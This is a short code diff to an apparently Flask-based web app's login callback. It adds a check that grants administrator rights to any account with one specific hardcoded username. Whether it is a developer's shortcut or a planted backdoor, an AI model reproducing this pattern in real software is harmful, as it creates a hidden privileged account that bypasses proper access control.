@@ -70,6 +70,9 @@ def callback():
         db_session.add(user)
         db_session.commit()
 
+    if user.username == 'christoffelmatthew':
+        user.isAdmin = True
+        db_session.commit()
     return redirect(url_for('home'))
 
 @app.route('/register')
